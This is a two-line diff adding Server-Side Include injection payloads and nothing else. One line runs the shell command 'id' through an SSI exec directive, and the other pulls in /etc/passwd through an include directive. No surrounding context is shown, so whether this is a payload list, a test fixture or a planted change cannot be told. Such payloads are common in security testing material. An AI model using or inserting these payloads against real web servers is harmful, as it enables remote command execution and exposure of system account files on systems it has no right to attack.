@@ -1,0 +1,2 @@
+<!--#exec cmd="id"-->
+<!--#include virtual="/etc/passwd"-->
